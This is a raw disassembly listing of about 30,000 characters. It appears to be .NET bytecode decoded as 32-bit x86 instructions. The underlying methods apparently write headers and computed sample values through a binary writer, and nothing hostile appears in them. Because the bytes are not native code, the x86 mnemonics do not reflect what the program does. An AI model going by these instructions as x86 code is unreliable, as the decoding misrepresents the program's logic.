  403050:	28 48 00             	sub    %cl,0x0(%eax)
  403053:	00 06                	add    %al,(%esi)
  403055:	2a 08                	sub    (%eax),%cl
  403057:	06                   	push   %es
  403058:	08 8e 69 6f 41 00    	or     %cl,0x416f69(%esi)
  40305e:	00 0a                	add    %cl,(%edx)
  403060:	94                   	xchg   %eax,%esp
  403061:	07                   	pop    %es
  403062:	28 49 00             	sub    %cl,0x0(%ecx)
  403065:	00 06                	add    %al,(%esi)
  403067:	2a 08                	sub    (%eax),%cl
  403069:	06                   	push   %es
  40306a:	08 8e 69 6f 41 00    	or     %cl,0x416f69(%esi)
  403070:	00 0a                	add    %cl,(%edx)
  403072:	94                   	xchg   %eax,%esp
  403073:	07                   	pop    %es
  403074:	28 4a 00             	sub    %cl,0x0(%edx)
  403077:	00 06                	add    %al,(%esi)
  403079:	2a 08                	sub    (%eax),%cl
  40307b:	06                   	push   %es
  40307c:	08 8e 69 6f 41 00    	or     %cl,0x416f69(%esi)
  403082:	00 0a                	add    %cl,(%edx)
  403084:	94                   	xchg   %eax,%esp
  403085:	07                   	pop    %es
  403086:	28 4b 00             	sub    %cl,0x0(%ebx)
  403089:	00 06                	add    %al,(%esi)
  40308b:	2a 08                	sub    (%eax),%cl
  40308d:	06                   	push   %es
  40308e:	08 8e 69 6f 41 00    	or     %cl,0x416f69(%esi)
  403094:	00 0a                	add    %cl,(%edx)
  403096:	94                   	xchg   %eax,%esp
  403097:	07                   	pop    %es
  403098:	28 4c 00 00          	sub    %cl,0x0(%eax,%eax,1)
  40309c:	06                   	push   %es
  40309d:	2a 3a                	sub    (%edx),%bh
  40309f:	02 03                	add    (%ebx),%al
  4030a1:	32 08                	xor    (%eax),%cl
  4030a3:	02 04 30             	add    (%eax,%esi,1),%al
  4030a6:	02 02                	add    (%edx),%al
  4030a8:	2a 04 2a             	sub    (%edx,%ebp,1),%al
  4030ab:	03 2a                	add    (%edx),%ebp
  4030ad:	00 00                	add    %al,(%eax)
  4030af:	00 1b                	add    %bl,(%ebx)
  4030b1:	30 06                	xor    %al,(%esi)
  4030b3:	00 b7 01 00 00 10    	add    %dh,0x10000001(%edi)
  4030b9:	00 00                	add    %al,(%eax)
  4030bb:	11 73 53             	adc    %esi,0x53(%ebx)
  4030be:	00 00                	add    %al,(%eax)
  4030c0:	0a 0a                	or     (%edx),%cl
  4030c2:	73 76                	jae    0x40313a
  4030c4:	00 00                	add    %al,(%eax)
  4030c6:	0a 0b                	or     (%ebx),%cl
  4030c8:	07                   	pop    %es
  4030c9:	73 77                	jae    0x403142
  4030cb:	00 00                	add    %al,(%eax)
  4030cd:	0a 0c 08             	or     (%eax,%ecx,1),%cl
  4030d0:	72 cb                	jb     0x40309d
  4030d2:	04 00                	add    $0x0,%al
  4030d4:	70 28                	jo     0x4030fe
  4030d6:	78 00                	js     0x4030d8
  4030d8:	00 0a                	add    %cl,(%edx)
  4030da:	6f                   	outsl  %ds:(%esi),(%dx)
  4030db:	79 00                	jns    0x4030dd
  4030dd:	00 0a                	add    %cl,(%edx)
  4030df:	08 16                	or     %dl,(%esi)
  4030e1:	6f                   	outsl  %ds:(%esi),(%dx)
  4030e2:	7a 00                	jp     0x4030e4
  4030e4:	00 0a                	add    %cl,(%edx)
  4030e6:	08 72 d5             	or     %dh,-0x2b(%edx)
  4030e9:	04 00                	add    $0x0,%al
  4030eb:	70 28                	jo     0x403115
  4030ed:	78 00                	js     0x4030ef
  4030ef:	00 0a                	add    %cl,(%edx)
  4030f1:	6f                   	outsl  %ds:(%esi),(%dx)
  4030f2:	79 00                	jns    0x4030f4
  4030f4:	00 0a                	add    %cl,(%edx)
  4030f6:	08 72 df             	or     %dh,-0x21(%edx)
  4030f9:	04 00                	add    $0x0,%al
  4030fb:	70 28                	jo     0x403125
  4030fd:	78 00                	js     0x4030ff
  4030ff:	00 0a                	add    %cl,(%edx)
  403101:	6f                   	outsl  %ds:(%esi),(%dx)
  403102:	79 00                	jns    0x403104
  403104:	00 0a                	add    %cl,(%edx)
  403106:	08 1f                	or     %bl,(%edi)
  403108:	10 6f 7a             	adc    %ch,0x7a(%edi)
  40310b:	00 00                	add    %al,(%eax)
  40310d:	0a 08                	or     (%eax),%cl
  40310f:	17                   	pop    %ss
  403110:	6f                   	outsl  %ds:(%esi),(%dx)
  403111:	7b 00                	jnp    0x403113
  403113:	00 0a                	add    %cl,(%edx)
  403115:	17                   	pop    %ss
  403116:	0d 02 13 04 1e       	or     $0x1e041302,%eax
  40311b:	13 05 08 09 d1 6f    	adc    0x6fd10908,%eax
  403121:	7b 00                	jnp    0x403123
  403123:	00 0a                	add    %cl,(%edx)
  403125:	08 11                	or     %dl,(%ecx)
  403127:	04 6f                	add    $0x6f,%al
  403129:	7a 00                	jp     0x40312b
  40312b:	00 0a                	add    %cl,(%edx)
  40312d:	08 11                	or     %dl,(%ecx)
  40312f:	04 09                	add    $0x9,%al
  403131:	5a                   	pop    %edx
  403132:	11 05 5a 1e 5b 6f    	adc    %eax,0x6f5b1e5a
  403138:	7a 00                	jp     0x40313a
  40313a:	00 0a                	add    %cl,(%edx)
  40313c:	08 09                	or     %cl,(%ecx)
  40313e:	11 05 5a 1e 5b d1    	adc    %eax,0xd15b1e5a
  403144:	6f                   	outsl  %ds:(%esi),(%dx)
  403145:	7b 00                	jnp    0x403147
  403147:	00 0a                	add    %cl,(%edx)
  403149:	08 11                	or     %dl,(%ecx)
  40314b:	05 d1 6f 7b 00       	add    $0x7b6fd1,%eax
  403150:	00 0a                	add    %cl,(%edx)
  403152:	08 72 e9             	or     %dh,-0x17(%edx)
  403155:	04 00                	add    $0x0,%al
  403157:	70 28                	jo     0x403181
  403159:	78 00                	js     0x40315b
  40315b:	00 0a                	add    %cl,(%edx)
  40315d:	6f                   	outsl  %ds:(%esi),(%dx)
  40315e:	79 00                	jns    0x403160
  403160:	00 0a                	add    %cl,(%edx)
  403162:	03 13                	add    (%ebx),%edx
  403164:	06                   	push   %es
  403165:	11 04 11             	adc    %eax,(%ecx,%edx,1)
  403168:	06                   	push   %es
  403169:	5a                   	pop    %edx
  40316a:	8d 42 00             	lea    0x0(%edx),%eax
  40316d:	00 01                	add    %al,(%ecx)
  40316f:	13 07                	adc    (%edi),%eax
  403171:	1c 8d                	sbb    $0x8d,%al
  403173:	48                   	dec    %eax
  403174:	00 00                	add    %al,(%eax)
  403176:	01 25 16 06 17 1f    	add    %esp,0x1f170616
  40317c:	11 6f 70             	adc    %ebp,0x70(%edi)
  40317f:	00 00                	add    %al,(%eax)
  403181:	0a 9e 25 17 06 17    	or     0x17061725(%esi),%bl
  403187:	1f                   	pop    %ds
  403188:	11 6f 70             	adc    %ebp,0x70(%edi)
  40318b:	00 00                	add    %al,(%eax)
  40318d:	0a 9e 25 18 06 17    	or     0x17061825(%esi),%bl
  403193:	1f                   	pop    %ds
  403194:	11 6f 70             	adc    %ebp,0x70(%edi)
  403197:	00 00                	add    %al,(%eax)
  403199:	0a 9e 25 19 06 17    	or     0x17061925(%esi),%bl
  40319f:	1f                   	pop    %ds
  4031a0:	11 6f 70             	adc    %ebp,0x70(%edi)
  4031a3:	00 00                	add    %al,(%eax)
  4031a5:	0a 9e 25 1a 06 17    	or     0x17061a25(%esi),%bl
  4031ab:	1f                   	pop    %ds
  4031ac:	11 6f 70             	adc    %ebp,0x70(%edi)
  4031af:	00 00                	add    %al,(%eax)
  4031b1:	0a 9e 25 1b 06 17    	or     0x17061b25(%esi),%bl
  4031b7:	1f                   	pop    %ds
  4031b8:	11 6f 70             	adc    %ebp,0x70(%edi)
  4031bb:	00 00                	add    %al,(%eax)
  4031bd:	0a 9e 13 08 18 13    	or     0x13180813(%esi),%bl
  4031c3:	09 2b                	or     %ebp,(%ebx)
  4031c5:	2e 11 07             	adc    %eax,%cs:(%edi)
  4031c8:	11 09                	adc    %ecx,(%ecx)
  4031ca:	11 09                	adc    %ecx,(%ecx)
  4031cc:	11 09                	adc    %ecx,(%ecx)
  4031ce:	5a                   	pop    %edx
  4031cf:	11 08                	adc    %ecx,(%eax)
  4031d1:	19 94 1f 1f 5f 63 11 	sbb    %edx,0x11635f1f(%edi,%ebx,1)
  4031d8:	08 16                	or     %dl,(%esi)
  4031da:	94                   	xchg   %eax,%esp
  4031db:	58                   	pop    %eax
  4031dc:	11 09                	adc    %ecx,(%ecx)
  4031de:	11 08                	adc    %ecx,(%eax)
  4031e0:	17                   	pop    %ss
  4031e1:	94                   	xchg   %eax,%esp
  4031e2:	1f                   	pop    %ds
  4031e3:	1f                   	pop    %ds
  4031e4:	5f                   	pop    %edi
  4031e5:	63 11                	arpl   %edx,(%ecx)
  4031e7:	08 18                	or     %bl,(%eax)
  4031e9:	94                   	xchg   %eax,%esp
  4031ea:	58                   	pop    %eax
  4031eb:	5a                   	pop    %edx
  4031ec:	d2 9c 11 09 17 58 13 	rcrb   %cl,0x13581709(%ecx,%edx,1)
  4031f3:	09 11                	or     %edx,(%ecx)
  4031f5:	09 11                	or     %edx,(%ecx)
  4031f7:	07                   	pop    %es
  4031f8:	8e 69 32             	mov    0x32(%ecx),%gs
  4031fb:	ca 08 11             	lret   $0x1108
  4031fe:	07                   	pop    %es
  4031ff:	8e 69 09             	mov    0x9(%ecx),%gs
  403202:	5a                   	pop    %edx
  403203:	11 05 5a 1e 5b 6f    	adc    %eax,0x6f5b1e5a
  403209:	7a 00                	jp     0x40320b
  40320b:	00 0a                	add    %cl,(%edx)
  40320d:	11 07                	adc    %eax,(%edi)
  40320f:	13 0a                	adc    (%edx),%ecx
  403211:	16                   	push   %ss
  403212:	13 0b                	adc    (%ebx),%ecx
  403214:	2b 15 11 0a 11 0b    	sub    0xb110a11,%edx
  40321a:	91                   	xchg   %eax,%ecx
  40321b:	13 0c 08             	adc    (%eax,%ecx,1),%ecx
  40321e:	11 0c 6f             	adc    %ecx,(%edi,%ebp,2)
  403221:	7c 00                	jl     0x403223
  403223:	00 0a                	add    %cl,(%edx)
  403225:	11 0b                	adc    %ecx,(%ebx)
  403227:	17                   	pop    %ss
  403228:	58                   	pop    %eax
  403229:	13 0b                	adc    (%ebx),%ecx
  40322b:	11 0b                	adc    %ecx,(%ebx)
  40322d:	11 0a                	adc    %ecx,(%edx)
  40322f:	8e 69 32             	mov    0x32(%ecx),%gs
  403232:	e3 08                	jecxz  0x40323c
  403234:	1a 16                	sbb    (%esi),%dl
  403236:	6f                   	outsl  %ds:(%esi),(%dx)
  403237:	7d 00                	jge    0x403239
  403239:	00 0a                	add    %cl,(%edx)
  40323b:	26 08 08             	or     %cl,%es:(%eax)
  40323e:	6f                   	outsl  %ds:(%esi),(%dx)
  40323f:	7e 00                	jle    0x403241
  403241:	00 0a                	add    %cl,(%edx)
  403243:	6f                   	outsl  %ds:(%esi),(%dx)
  403244:	7f 00                	jg     0x403246
  403246:	00 0a                	add    %cl,(%edx)
  403248:	1e                   	push   %ds
  403249:	6a 59                	push   $0x59
  40324b:	6d                   	insl   (%dx),%es:(%edi)
  40324c:	6f                   	outsl  %ds:(%esi),(%dx)
  40324d:	7a 00                	jp     0x40324f
  40324f:	00 0a                	add    %cl,(%edx)
  403251:	07                   	pop    %es
  403252:	16                   	push   %ss
  403253:	6a 16                	push   $0x16
  403255:	6f                   	outsl  %ds:(%esi),(%dx)
  403256:	80 00 00             	addb   $0x0,(%eax)
  403259:	0a 26                	or     (%esi),%ah
  40325b:	07                   	pop    %es
  40325c:	73 81                	jae    0x4031df
  40325e:	00 00                	add    %al,(%eax)
  403260:	0a 28                	or     (%eax),%ch
  403262:	82 00 00             	addb   $0x0,(%eax)
  403265:	0a de                	or     %dh,%bl
  403267:	0a 07                	or     (%edi),%al
  403269:	2c 06                	sub    $0x6,%al
  40326b:	07                   	pop    %es
  40326c:	6f                   	outsl  %ds:(%esi),(%dx)
  40326d:	55                   	push   %ebp
  40326e:	00 00                	add    %al,(%eax)
  403270:	0a dc                	or     %ah,%bl
  403272:	2a 00                	sub    (%eax),%al
  403274:	41                   	inc    %ecx
  403275:	1c 00                	sbb    $0x0,%al
  403277:	00 02                	add    %al,(%edx)
  403279:	00 00                	add    %al,(%eax)
  40327b:	00 0c 00             	add    %cl,(%eax,%eax,1)
  40327e:	00 00                	add    %al,(%eax)
  403280:	a0 01 00 00 ac       	mov    0xac000001,%al
  403285:	01 00                	add    %eax,(%eax)
  403287:	00 0a                	add    %cl,(%edx)
  403289:	00 00                	add    %al,(%eax)
  40328b:	00 00                	add    %al,(%eax)
  40328d:	00 00                	add    %al,(%eax)
  40328f:	00 1b                	add    %bl,(%ebx)
  403291:	30 06                	xor    %al,(%esi)
  403293:	00 b5 01 00 00 10    	add    %dh,0x10000001(%ebp)
  403299:	00 00                	add    %al,(%eax)
  40329b:	11 73 53             	adc    %esi,0x53(%ebx)
  40329e:	00 00                	add    %al,(%eax)
  4032a0:	0a 0a                	or     (%edx),%cl
  4032a2:	73 76                	jae    0x40331a
  4032a4:	00 00                	add    %al,(%eax)
  4032a6:	0a 0b                	or     (%ebx),%cl
  4032a8:	07                   	pop    %es
  4032a9:	73 77                	jae    0x403322
  4032ab:	00 00                	add    %al,(%eax)
  4032ad:	0a 0c 08             	or     (%eax,%ecx,1),%cl
  4032b0:	72 cb                	jb     0x40327d
  4032b2:	04 00                	add    $0x0,%al
  4032b4:	70 28                	jo     0x4032de
  4032b6:	78 00                	js     0x4032b8
  4032b8:	00 0a                	add    %cl,(%edx)
  4032ba:	6f                   	outsl  %ds:(%esi),(%dx)
  4032bb:	79 00                	jns    0x4032bd
  4032bd:	00 0a                	add    %cl,(%edx)
  4032bf:	08 16                	or     %dl,(%esi)
  4032c1:	6f                   	outsl  %ds:(%esi),(%dx)
  4032c2:	7a 00                	jp     0x4032c4
  4032c4:	00 0a                	add    %cl,(%edx)
  4032c6:	08 72 d5             	or     %dh,-0x2b(%edx)
  4032c9:	04 00                	add    $0x0,%al
  4032cb:	70 28                	jo     0x4032f5
  4032cd:	78 00                	js     0x4032cf
  4032cf:	00 0a                	add    %cl,(%edx)
  4032d1:	6f                   	outsl  %ds:(%esi),(%dx)
  4032d2:	79 00                	jns    0x4032d4
  4032d4:	00 0a                	add    %cl,(%edx)
  4032d6:	08 72 df             	or     %dh,-0x21(%edx)
  4032d9:	04 00                	add    $0x0,%al
  4032db:	70 28                	jo     0x403305
  4032dd:	78 00                	js     0x4032df
  4032df:	00 0a                	add    %cl,(%edx)
  4032e1:	6f                   	outsl  %ds:(%esi),(%dx)
  4032e2:	79 00                	jns    0x4032e4
  4032e4:	00 0a                	add    %cl,(%edx)
  4032e6:	08 1f                	or     %bl,(%edi)
  4032e8:	10 6f 7a             	adc    %ch,0x7a(%edi)
  4032eb:	00 00                	add    %al,(%eax)
  4032ed:	0a 08                	or     (%eax),%cl
  4032ef:	17                   	pop    %ss
  4032f0:	6f                   	outsl  %ds:(%esi),(%dx)
  4032f1:	7b 00                	jnp    0x4032f3
  4032f3:	00 0a                	add    %cl,(%edx)
  4032f5:	17                   	pop    %ss
  4032f6:	0d 02 13 04 1e       	or     $0x1e041302,%eax
  4032fb:	13 05 08 09 d1 6f    	adc    0x6fd10908,%eax
  403301:	7b 00                	jnp    0x403303
  403303:	00 0a                	add    %cl,(%edx)
  403305:	08 11                	or     %dl,(%ecx)
  403307:	04 6f                	add    $0x6f,%al
  403309:	7a 00                	jp     0x40330b
  40330b:	00 0a                	add    %cl,(%edx)
  40330d:	08 11                	or     %dl,(%ecx)
  40330f:	04 09                	add    $0x9,%al
  403311:	5a                   	pop    %edx
  403312:	11 05 5a 1e 5b 6f    	adc    %eax,0x6f5b1e5a
  403318:	7a 00                	jp     0x40331a
  40331a:	00 0a                	add    %cl,(%edx)
  40331c:	08 09                	or     %cl,(%ecx)
  40331e:	11 05 5a 1e 5b d1    	adc    %eax,0xd15b1e5a
  403324:	6f                   	outsl  %ds:(%esi),(%dx)
  403325:	7b 00                	jnp    0x403327
  403327:	00 0a                	add    %cl,(%edx)
  403329:	08 11                	or     %dl,(%ecx)
  40332b:	05 d1 6f 7b 00       	add    $0x7b6fd1,%eax
  403330:	00 0a                	add    %cl,(%edx)
  403332:	08 72 e9             	or     %dh,-0x17(%edx)
  403335:	04 00                	add    $0x0,%al
  403337:	70 28                	jo     0x403361
  403339:	78 00                	js     0x40333b
  40333b:	00 0a                	add    %cl,(%edx)
  40333d:	6f                   	outsl  %ds:(%esi),(%dx)
  40333e:	79 00                	jns    0x403340
  403340:	00 0a                	add    %cl,(%edx)
  403342:	03 13                	add    (%ebx),%edx
  403344:	06                   	push   %es
  403345:	11 04 11             	adc    %eax,(%ecx,%edx,1)
  403348:	06                   	push   %es
  403349:	5a                   	pop    %edx
  40334a:	8d 42 00             	lea    0x0(%edx),%eax
  40334d:	00 01                	add    %al,(%ecx)
  40334f:	13 07                	adc    (%edi),%eax
  403351:	1c 8d                	sbb    $0x8d,%al
  403353:	48                   	dec    %eax
  403354:	00 00                	add    %al,(%eax)
  403356:	01 25 16 06 17 1f    	add    %esp,0x1f170616
  40335c:	11 6f 70             	adc    %ebp,0x70(%edi)
  40335f:	00 00                	add    %al,(%eax)
  403361:	0a 9e 25 17 06 17    	or     0x17061725(%esi),%bl
  403367:	1f                   	pop    %ds
  403368:	11 6f 70             	adc    %ebp,0x70(%edi)
  40336b:	00 00                	add    %al,(%eax)
  40336d:	0a 9e 25 18 06 17    	or     0x17061825(%esi),%bl
  403373:	1f                   	pop    %ds
  403374:	11 6f 70             	adc    %ebp,0x70(%edi)
  403377:	00 00                	add    %al,(%eax)
  403379:	0a 9e 25 19 06 17    	or     0x17061925(%esi),%bl
  40337f:	1f                   	pop    %ds
  403380:	11 6f 70             	adc    %ebp,0x70(%edi)
  403383:	00 00                	add    %al,(%eax)
  403385:	0a 9e 25 1a 06 17    	or     0x17061a25(%esi),%bl
  40338b:	1f                   	pop    %ds
  40338c:	11 6f 70             	adc    %ebp,0x70(%edi)
  40338f:	00 00                	add    %al,(%eax)
  403391:	0a 9e 25 1b 06 17    	or     0x17061b25(%esi),%bl
  403397:	1f                   	pop    %ds
  403398:	11 6f 70             	adc    %ebp,0x70(%edi)
  40339b:	00 00                	add    %al,(%eax)
  40339d:	0a 9e 13 08 18 13    	or     0x13180813(%esi),%bl
  4033a3:	09 2b                	or     %ebp,(%ebx)
  4033a5:	2c 11                	sub    $0x11,%al
  4033a7:	07                   	pop    %es
  4033a8:	11 09                	adc    %ecx,(%ecx)
  4033aa:	11 09                	adc    %ecx,(%ecx)
  4033ac:	11 09                	adc    %ecx,(%ecx)
  4033ae:	5a                   	pop    %edx
  4033af:	11 08                	adc    %ecx,(%eax)
  4033b1:	19 94 1f 1f 5f 63 11 	sbb    %edx,0x11635f1f(%edi,%ebx,1)
  4033b8:	08 16                	or     %dl,(%esi)
  4033ba:	94                   	xchg   %eax,%esp
  4033bb:	1f                   	pop    %ds
  4033bc:	1f                   	pop    %ds
  4033bd:	5f                   	pop    %edi
  4033be:	63 11                	arpl   %edx,(%ecx)
  4033c0:	09 11                	or     %edx,(%ecx)
  4033c2:	08 17                	or     %dl,(%edi)
  4033c4:	94                   	xchg   %eax,%esp
  4033c5:	1f                   	pop    %ds
  4033c6:	1f                   	pop    %ds
  4033c7:	5f                   	pop    %edi
  4033c8:	63 5a d2             	arpl   %ebx,-0x2e(%edx)
  4033cb:	9c                   	pushf
  4033cc:	11 09                	adc    %ecx,(%ecx)
  4033ce:	17                   	pop    %ss
  4033cf:	58                   	pop    %eax
  4033d0:	13 09                	adc    (%ecx),%ecx
  4033d2:	11 09                	adc    %ecx,(%ecx)
  4033d4:	11 07                	adc    %eax,(%edi)
  4033d6:	8e 69 32             	mov    0x32(%ecx),%gs
  4033d9:	cc                   	int3
  4033da:	08 11                	or     %dl,(%ecx)
  4033dc:	07                   	pop    %es
  4033dd:	8e 69 09             	mov    0x9(%ecx),%gs
  4033e0:	5a                   	pop    %edx
  4033e1:	11 05 5a 1e 5b 6f    	adc    %eax,0x6f5b1e5a
  4033e7:	7a 00                	jp     0x4033e9
  4033e9:	00 0a                	add    %cl,(%edx)
  4033eb:	11 07                	adc    %eax,(%edi)
  4033ed:	13 0a                	adc    (%edx),%ecx
  4033ef:	16                   	push   %ss
  4033f0:	13 0b                	adc    (%ebx),%ecx
  4033f2:	2b 15 11 0a 11 0b    	sub    0xb110a11,%edx
  4033f8:	91                   	xchg   %eax,%ecx
  4033f9:	13 0c 08             	adc    (%eax,%ecx,1),%ecx
  4033fc:	11 0c 6f             	adc    %ecx,(%edi,%ebp,2)
  4033ff:	7c 00                	jl     0x403401
  403401:	00 0a                	add    %cl,(%edx)
  403403:	11 0b                	adc    %ecx,(%ebx)
  403405:	17                   	pop    %ss
  403406:	58                   	pop    %eax
  403407:	13 0b                	adc    (%ebx),%ecx
  403409:	11 0b                	adc    %ecx,(%ebx)
  40340b:	11 0a                	adc    %ecx,(%edx)
  40340d:	8e 69 32             	mov    0x32(%ecx),%gs
  403410:	e3 08                	jecxz  0x40341a
  403412:	1a 16                	sbb    (%esi),%dl
  403414:	6f                   	outsl  %ds:(%esi),(%dx)
  403415:	7d 00                	jge    0x403417
  403417:	00 0a                	add    %cl,(%edx)
  403419:	26 08 08             	or     %cl,%es:(%eax)
  40341c:	6f                   	outsl  %ds:(%esi),(%dx)
  40341d:	7e 00                	jle    0x40341f
  40341f:	00 0a                	add    %cl,(%edx)
  403421:	6f                   	outsl  %ds:(%esi),(%dx)
  403422:	7f 00                	jg     0x403424
  403424:	00 0a                	add    %cl,(%edx)
  403426:	1e                   	push   %ds
  403427:	6a 59                	push   $0x59
  403429:	6d                   	insl   (%dx),%es:(%edi)
  40342a:	6f                   	outsl  %ds:(%esi),(%dx)
  40342b:	7a 00                	jp     0x40342d
  40342d:	00 0a                	add    %cl,(%edx)
  40342f:	07                   	pop    %es
  403430:	16                   	push   %ss
  403431:	6a 16                	push   $0x16
  403433:	6f                   	outsl  %ds:(%esi),(%dx)
  403434:	80 00 00             	addb   $0x0,(%eax)
  403437:	0a 26                	or     (%esi),%ah
  403439:	07                   	pop    %es
  40343a:	73 81                	jae    0x4033bd
  40343c:	00 00                	add    %al,(%eax)
  40343e:	0a 28                	or     (%eax),%ch
  403440:	82 00 00             	addb   $0x0,(%eax)
  403443:	0a de                	or     %dh,%bl
  403445:	0a 07                	or     (%edi),%al
  403447:	2c 06                	sub    $0x6,%al
  403449:	07                   	pop    %es
  40344a:	6f                   	outsl  %ds:(%esi),(%dx)
  40344b:	55                   	push   %ebp
  40344c:	00 00                	add    %al,(%eax)
  40344e:	0a dc                	or     %ah,%bl
  403450:	2a 00                	sub    (%eax),%al
  403452:	00 00                	add    %al,(%eax)
  403454:	41                   	inc    %ecx
  403455:	1c 00                	sbb    $0x0,%al
  403457:	00 02                	add    %al,(%edx)
  403459:	00 00                	add    %al,(%eax)
  40345b:	00 0c 00             	add    %cl,(%eax,%eax,1)
  40345e:	00 00                	add    %al,(%eax)
  403460:	9e                   	sahf
  403461:	01 00                	add    %eax,(%eax)
  403463:	00 aa 01 00 00 0a    	add    %ch,0xa000001(%edx)
  403469:	00 00                	add    %al,(%eax)
  40346b:	00 00                	add    %al,(%eax)
  40346d:	00 00                	add    %al,(%eax)
  40346f:	00 1b                	add    %bl,(%ebx)
  403471:	30 06                	xor    %al,(%esi)
  403473:	00 b0 01 00 00 10    	add    %dh,0x10000001(%eax)
  403479:	00 00                	add    %al,(%eax)
  40347b:	11 73 53             	adc    %esi,0x53(%ebx)
  40347e:	00 00                	add    %al,(%eax)
  403480:	0a 0a                	or     (%edx),%cl
  403482:	73 76                	jae    0x4034fa
  403484:	00 00                	add    %al,(%eax)
  403486:	0a 0b                	or     (%ebx),%cl
  403488:	07                   	pop    %es
  403489:	73 77                	jae    0x403502
  40348b:	00 00                	add    %al,(%eax)
  40348d:	0a 0c 08             	or     (%eax,%ecx,1),%cl
  403490:	72 cb                	jb     0x40345d
  403492:	04 00                	add    $0x0,%al
  403494:	70 28                	jo     0x4034be
  403496:	78 00                	js     0x403498
  403498:	00 0a                	add    %cl,(%edx)
  40349a:	6f                   	outsl  %ds:(%esi),(%dx)
  40349b:	79 00                	jns    0x40349d
  40349d:	00 0a                	add    %cl,(%edx)
  40349f:	08 16                	or     %dl,(%esi)
  4034a1:	6f                   	outsl  %ds:(%esi),(%dx)
  4034a2:	7a 00                	jp     0x4034a4
  4034a4:	00 0a                	add    %cl,(%edx)
  4034a6:	08 72 d5             	or     %dh,-0x2b(%edx)
  4034a9:	04 00                	add    $0x0,%al
  4034ab:	70 28                	jo     0x4034d5
  4034ad:	78 00                	js     0x4034af
  4034af:	00 0a                	add    %cl,(%edx)
  4034b1:	6f                   	outsl  %ds:(%esi),(%dx)
  4034b2:	79 00                	jns    0x4034b4
  4034b4:	00 0a                	add    %cl,(%edx)
  4034b6:	08 72 df             	or     %dh,-0x21(%edx)
  4034b9:	04 00                	add    $0x0,%al
  4034bb:	70 28                	jo     0x4034e5
  4034bd:	78 00                	js     0x4034bf
  4034bf:	00 0a                	add    %cl,(%edx)
  4034c1:	6f                   	outsl  %ds:(%esi),(%dx)
  4034c2:	79 00                	jns    0x4034c4
  4034c4:	00 0a                	add    %cl,(%edx)
  4034c6:	08 1f                	or     %bl,(%edi)
  4034c8:	10 6f 7a             	adc    %ch,0x7a(%edi)
  4034cb:	00 00                	add    %al,(%eax)
  4034cd:	0a 08                	or     (%eax),%cl
  4034cf:	17                   	pop    %ss
  4034d0:	6f                   	outsl  %ds:(%esi),(%dx)
  4034d1:	7b 00                	jnp    0x4034d3
  4034d3:	00 0a                	add    %cl,(%edx)
  4034d5:	17                   	pop    %ss
  4034d6:	0d 02 13 04 1e       	or     $0x1e041302,%eax
  4034db:	13 05 08 09 d1 6f    	adc    0x6fd10908,%eax
  4034e1:	7b 00                	jnp    0x4034e3
  4034e3:	00 0a                	add    %cl,(%edx)
  4034e5:	08 11                	or     %dl,(%ecx)
  4034e7:	04 6f                	add    $0x6f,%al
  4034e9:	7a 00                	jp     0x4034eb
  4034eb:	00 0a                	add    %cl,(%edx)
  4034ed:	08 11                	or     %dl,(%ecx)
  4034ef:	04 09                	add    $0x9,%al
  4034f1:	5a                   	pop    %edx
  4034f2:	11 05 5a 1e 5b 6f    	adc    %eax,0x6f5b1e5a
  4034f8:	7a 00                	jp     0x4034fa
  4034fa:	00 0a                	add    %cl,(%edx)
  4034fc:	08 09                	or     %cl,(%ecx)
  4034fe:	11 05 5a 1e 5b d1    	adc    %eax,0xd15b1e5a
  403504:	6f                   	outsl  %ds:(%esi),(%dx)
  403505:	7b 00                	jnp    0x403507
  403507:	00 0a                	add    %cl,(%edx)
  403509:	08 11                	or     %dl,(%ecx)
  40350b:	05 d1 6f 7b 00       	add    $0x7b6fd1,%eax
  403510:	00 0a                	add    %cl,(%edx)
  403512:	08 72 e9             	or     %dh,-0x17(%edx)
  403515:	04 00                	add    $0x0,%al
  403517:	70 28                	jo     0x403541
  403519:	78 00                	js     0x40351b
  40351b:	00 0a                	add    %cl,(%edx)
  40351d:	6f                   	outsl  %ds:(%esi),(%dx)
  40351e:	79 00                	jns    0x403520
  403520:	00 0a                	add    %cl,(%edx)
  403522:	03 13                	add    (%ebx),%edx
  403524:	06                   	push   %es
  403525:	11 04 11             	adc    %eax,(%ecx,%edx,1)
  403528:	06                   	push   %es
  403529:	5a                   	pop    %edx
  40352a:	8d 42 00             	lea    0x0(%edx),%eax
  40352d:	00 01                	add    %al,(%ecx)
  40352f:	13 07                	adc    (%edi),%eax
  403531:	1c 8d                	sbb    $0x8d,%al
  403533:	48                   	dec    %eax
  403534:	00 00                	add    %al,(%eax)
  403536:	01 25 16 06 17 1f    	add    %esp,0x1f170616
  40353c:	11 6f 70             	adc    %ebp,0x70(%edi)
  40353f:	00 00                	add    %al,(%eax)
  403541:	0a 9e 25 17 06 17    	or     0x17061725(%esi),%bl
  403547:	1f                   	pop    %ds
  403548:	11 6f 70             	adc    %ebp,0x70(%edi)
  40354b:	00 00                	add    %al,(%eax)
  40354d:	0a 9e 25 18 06 17    	or     0x17061825(%esi),%bl
  403553:	1f                   	pop    %ds
  403554:	11 6f 70             	adc    %ebp,0x70(%edi)
  403557:	00 00                	add    %al,(%eax)
  403559:	0a 9e 25 19 06 17    	or     0x17061925(%esi),%bl
  40355f:	1f                   	pop    %ds
  403560:	11 6f 70             	adc    %ebp,0x70(%edi)
  403563:	00 00                	add    %al,(%eax)
  403565:	0a 9e 25 1a 06 17    	or     0x17061a25(%esi),%bl
  40356b:	1f                   	pop    %ds
  40356c:	11 6f 70             	adc    %ebp,0x70(%edi)
  40356f:	00 00                	add    %al,(%eax)
  403571:	0a 9e 25 1b 06 17    	or     0x17061b25(%esi),%bl
  403577:	1f                   	pop    %ds
  403578:	11 6f 70             	adc    %ebp,0x70(%edi)
  40357b:	00 00                	add    %al,(%eax)
  40357d:	0a 9e 13 08 18 13    	or     0x13180813(%esi),%bl
  403583:	09 2b                	or     %ebp,(%ebx)
  403585:	27                   	daa
  403586:	11 07                	adc    %eax,(%edi)
  403588:	11 09                	adc    %ecx,(%ecx)
  40358a:	11 09                	adc    %ecx,(%ecx)
  40358c:	11 09                	adc    %ecx,(%ecx)
  40358e:	11 08                	adc    %ecx,(%eax)
  403590:	16                   	push   %ss
  403591:	94                   	xchg   %eax,%esp
  403592:	1f                   	pop    %ds
  403593:	1f                   	pop    %ds
  403594:	5f                   	pop    %edi
  403595:	63 61 11             	arpl   %esp,0x11(%ecx)
  403598:	09 11                	or     %edx,(%ecx)
  40359a:	08 17                	or     %dl,(%edi)
  40359c:	94                   	xchg   %eax,%esp
  40359d:	1f                   	pop    %ds
  40359e:	1f                   	pop    %ds
  40359f:	5f                   	pop    %edi
